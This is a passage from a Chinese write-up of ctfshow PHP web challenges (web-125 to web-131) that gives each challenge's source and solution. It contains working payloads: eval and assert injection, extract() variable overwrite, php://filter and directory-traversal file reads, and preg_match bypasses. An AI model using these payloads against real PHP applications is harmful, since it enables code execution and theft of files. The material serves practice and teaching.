class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里正则过滤掉了上题我们使用的echo，但是还可以使用<code>highlight_file</code>+get传参的形式来输出文件内容。然后依旧用<code>[</code>来绕过，会自动转换为下划线，然后后面的点就不会被转换</p><p>payload：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">?<span class="hljs-number">1</span>=flag.php<br>post：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">highlight_file</span><span class="hljs-params">($_GET[<span class="hljs-number">1</span>])</span></span><br><br>上题使用$_SERVER[<span class="hljs-string">&#x27;argv&#x27;</span>]构造的payload依然能用，因为没有过滤eval<br><br>?$fl0g=flag_give_me;                        <br>POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">eval</span><span class="hljs-params">($a[<span class="hljs-number">0</span>])</span></span>       <br></code></pre></td></tr></table></figure><hr><h2 id="web-126（assert、arg）"><a href="#web-126（assert、arg）" class="headerlink" title="web-126（assert、arg）"></a>web-126（assert、arg）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这里有多过滤了几个字母，所以用highlight_file输出的方法不能用了，但是还是可以使用上题另一种payload</strong><br><strong>，这里还可以使用assert()来对$fl0g进行赋值。assert()相当于eval()，他能将字符串当做php代码来执行，且assert不需要严格遵从语法，比如末尾的分号可以不加。</strong></p><p>payload：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">使用assert()和$_SERVER<br><br>?$fl0g=flag_give_me <span class="hljs-comment">//这里可以不用分号</span><br>POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">assert</span><span class="hljs-params">($a[<span class="hljs-number">0</span>])</span></span><br><br>使用上题的payload<br>?$fl0g=flag_give_me;                        <br>POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">eval</span><span class="hljs-params">($a[<span class="hljs-number">0</span>])</span></span>      <br></code></pre></td></tr></table></figure><hr><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p><strong>相当于eval()，也是危险函数，他能将其中的字符串当做php代码来执行，且assert不需要严格遵从语法，比如末尾的分号可以不加。</strong></p><hr><h2 id="web-127（extract-、-SERVER-‘QUERY-STRING’-）"><a href="#web-127（extract-、-SERVER-‘QUERY-STRING’-）" class="headerlink" title="web-127（extract()、$_SERVER[‘QUERY_STRING’]）"></a>web-127（extract()、$_SERVER[‘QUERY_STRING’]）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//特殊字符检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;嗯哼？&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>&#96;这里我们要让$ctf_show这个变量全等于’ilove36d’才能输出flag，所以我们可以利用extract()函数，该函数可以用于将数组中的键值对转换为变量和其对应的值，我们传入?ctf_show&#x3D;ilove36d，就会使$ctf_show&#x3D;ilove36d。</strong></p><p><strong>然后这里不能直接使用<code>_</code>下划线，被正则过滤了，所以要使用绕过，因为[、.点、+都被过滤了只能用空格绕过了</strong><br><strong><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是GET传参数据（<code>?</code>后面的键值），此时<code>%20(空格)</code>没有被转化为<code>_</code>；只有<code>$_GET</code>获取变量的时候，因为变量名不符合规范，<code>%20(空格)</code>才会被转换为<code>_</code>。</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?ctf%<span class="hljs-attribute">20show</span>=ilove36d<br></code></pre></td></tr></table></figure><hr><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>PHP extract()函数从<a href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84/0?fromModule=lemma_inlink">数组</a>中把<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F/0?fromModule=lemma_inlink">变量</a>导入到当前的<a href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E8%A1%A8/0?fromModule=lemma_inlink">符号表</a>中。 </p><p>对于数组中的每个元素，键名用于变量名，键值用于<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F%E5%80%BC/8414141?fromModule=lemma_inlink">变量值</a>。</p><p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。</p><p>本函数返回成功设置的变量数目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-keyword">array</span>,extract_rules,prefix)<br><br>例子<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>&quot;</span>;<span class="hljs-meta">?&gt;</span><br>输出：<br><span class="hljs-variable">$a</span> = Cat; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse<br></code></pre></td></tr></table></figure><hr><h3 id="SERVER-‘QUERY-STRING’"><a href="#SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘QUERY_STRING’]</h3><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899">https://blog.csdn.net/qq_49480008/article/details/115872899</a></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是GET传参数据（<code>?</code>后面的键值）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">例如：<br>?<span class="hljs-attribute">ctf_show</span>=123<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>echo <span class="hljs-variable">$a</span>;<br><br>输出<br><span class="hljs-string">&#x27;ctf_show=123&#x27;</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-128（gettext-、get-defined-vars-）"><a href="#web-128（gettext-、get-defined-vars-）" class="headerlink" title="web-128（gettext()、get_defined_vars()）"></a>web-128（gettext()、get_defined_vars()）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$f1</span>))&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嗯哼？&quot;</span>;<br>&#125;<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p><p><strong>get_defined_vars 函数可以输出所有变量的信息，两者结合拿到 flag</strong></p><p><strong>首先在第一个call_user_func回调函数内，_()即被回调的参数，然后get_defined_vars为参数，_()会将get_defined_vars输出，接着又是一个call_user_func回调函数执行get_define_vars然后外面的var_dump会将其结果输出，这样就能拿到flag了</strong></p><p>payload：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure><hr><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p><strong>_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p><p><strong>string gettext( string $message) 返回输入的字符</strong><br><strong>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展，_是gettext的别名。需要php扩展目录下有php_gettext.dll</strong></p><p><strong>echo gettext(“Welcome to My PHP Application”);</strong></p><hr><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><strong>get_defined_vars — 返回由所有已定义变量所组成的数组</strong></p><hr><h2 id="web-129（stripos-、php伪协议-嵌套无效协议-、目录穿越）"><a href="#web-129（stripos-、php伪协议-嵌套无效协议-、目录穿越）" class="headerlink" title="web-129（stripos()、php伪协议(嵌套无效协议)、目录穿越）"></a>web-129（stripos()、php伪协议(嵌套无效协议)、目录穿越）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$f</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里有一个stripos函数，会匹配我们GET方法传入的值，如果其中存在’ctfshow’字符串，就会echo readfile($f)，所以我们的payload中必须含有ctfshow，且不能影响读取。这里有两种做法，一种是php伪协议嵌套无效协议，第二种就是目录穿越，相当于进入ctfshow文件夹又跳出，然后访问flag.php</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">php伪协议在遇到无效协议时，会自动忽略。<br>?<span class="hljs-attribute">f</span>=php://filter/ctfshow/resource=flag.php<br><br>目录穿越<br>?<span class="hljs-attribute">f</span>=./ctfshow/../flag.php<br></code></pre></td></tr></table></figure><p>注意：两种方法都需要查看源代码才能看到flag</p><hr><h3 id="stripos"><a href="#stripos" class="headerlink" title="stripos()"></a>stripos()</h3><p>stripos</p><p>注意：如果参数为数组，直接输出null</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">stripos</span> </span><br><span class="hljs-function"><span class="hljs-params">(PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">stripos</span> — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="hljs-function">说明 </span><br><span class="hljs-function"><span class="hljs-title">mixed</span> <span class="hljs-title">stripos</span><span class="hljs-params">( string <span class="hljs-string">$h</span>aystack, string <span class="hljs-string">$n</span>eedle[, int <span class="hljs-string">$o</span>ffset = <span class="hljs-number">0</span>] )</span></span><br><span class="hljs-function">返回在字符串 <span class="hljs-title">haystack</span> 中 <span class="hljs-title">needle</span> 首次出现的数字位置。 </span><br><span class="hljs-function">与 <span class="hljs-title">strpos</span><span class="hljs-params">()</span> 不同，<span class="hljs-title">stripos</span><span class="hljs-params">()</span> 不区分大小写。 </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">参数 </span><br><span class="hljs-function"><span class="hljs-title">haystack</span></span><br><span class="hljs-function">在该字符串中查找。 </span><br><span class="hljs-function"><span class="hljs-title">needle</span></span><br><span class="hljs-function">注意 <span class="hljs-title">needle</span> 可以是一个单字符或者多字符的字符串。 </span><br><span class="hljs-function">如果 <span class="hljs-title">needle</span> 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。 </span><br><span class="hljs-function"><span class="hljs-title">offset</span></span><br><span class="hljs-function">可选的 <span class="hljs-title">offset</span> 参数，从字符此数量的开始位置进行搜索。如果是负数，就从字符末尾此数量的字符数开始统计。 </span><br><span class="hljs-function"></span><br><span class="hljs-function">返回值 </span><br><span class="hljs-function">返回 <span class="hljs-title">needle</span> 存在于 <span class="hljs-title">haystack</span> 字符串开始的位置<span class="hljs-params">(独立于偏移量)</span>。同时注意字符串位置起始于 0，而不是 1。 </span><br><span class="hljs-function">如果未发现 <span class="hljs-title">needle</span> 将返回 FALSE。 </span><br></code></pre></td></tr></table></figure><hr><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><p>readfile</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$use_include_path</span> = <span class="hljs-literal">false</span>, resource <span class="hljs-variable">$context</span> = ?): <span class="hljs-keyword">int</span><br> 读取文件并写入到输出缓冲。 <br> <br>参数<br>filename<br>    要读取的文件名。<br>use_include_path<br>    想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 <span class="hljs-literal">true</span>。<br>context<br>    Stream 上下文（context） resource。<br>返回值<br>成功时返回从文件中读入的字节数， 或者在失败时返回 <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><hr><h3 id="php伪协议嵌套无效协议"><a href="#php伪协议嵌套无效协议" class="headerlink" title="php伪协议嵌套无效协议"></a>php伪协议嵌套无效协议</h3><p>php伪协议在遇到无效协议时，会自动忽略。</p><p>当我们的伪协议中需要包含一些内容，但又不影响我们的读取，就可以使用这种方法</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode|ctfshow/</span>resource=flag.php<br>?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/|ctfshow/</span>resource=flag.php<br></code></pre></td></tr></table></figure><hr><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><a href="https://www.cnblogs.com/milantgh/p/3756726.html">目录穿越详解</a></p><hr><h2 id="web-130（数组绕过preg-match-stripos、正则匹配）"><a href="#web-130（数组绕过preg-match-stripos、正则匹配）" class="headerlink" title="web-130（数组绕过preg_match&#x2F;stripos、正则匹配）"></a>web-130（数组绕过preg_match&#x2F;stripos、正则匹配）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>我们用post传入的f，我们要构造payload，让其能绕过preg_match正则匹配和stripos匹配。</p><p>payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">**+?表示 重复<span class="hljs-number">1</span>次或更多次，但尽可能少重复意思是ctfshow前面必须至少有一个字符，才会匹配到，并且下面的stripos函数要求必须匹配到ctfshow，所以直接传ctfshow即可**<br><br><span class="hljs-built_in">post</span>：f=ctfshow<br><br>也可以使用数组绕过preg_match和stripos<br>因为preg_match无法处理数组会直接返回<span class="hljs-literal">false</span>，并且stripos()是匹配子串，遇到数组，直接输出<span class="hljs-literal">null</span>。注意，两个等于（<span class="hljs-literal">null</span>==<span class="hljs-literal">false</span>）成立；三个等于（<span class="hljs-literal">null</span>===<span class="hljs-literal">false</span>）不成立。<br><br><span class="hljs-built_in">post</span>：f[]=<br></code></pre></td></tr></table></figure><hr><h2 id="web-131（PCRE回溯次数绕过preg-match）"><a href="#web-131（PCRE回溯次数绕过preg-match）" class="headerlink" title="web-131（PCRE回溯次数绕过preg_match）"></a>web-131（PCRE回溯次数绕过preg_match）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ 